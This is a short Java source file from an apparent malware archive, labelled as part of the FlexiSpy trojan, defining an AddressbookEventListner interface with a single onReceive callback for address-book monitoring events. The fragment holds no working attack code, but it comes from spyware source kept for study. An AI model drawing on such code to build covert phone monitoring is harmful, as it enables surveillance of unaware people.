/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.processaddressbookmanager.monitor;

import java.util.List;

import com.vvt.base.FxEvent;

/**
 * @author Aruna
 * @version 1.0
 * @created 07-Oct-2011 03:22:44
 */
public interface AddressbookEventListner {
	public void onReceive(final List<FxEvent> events);
}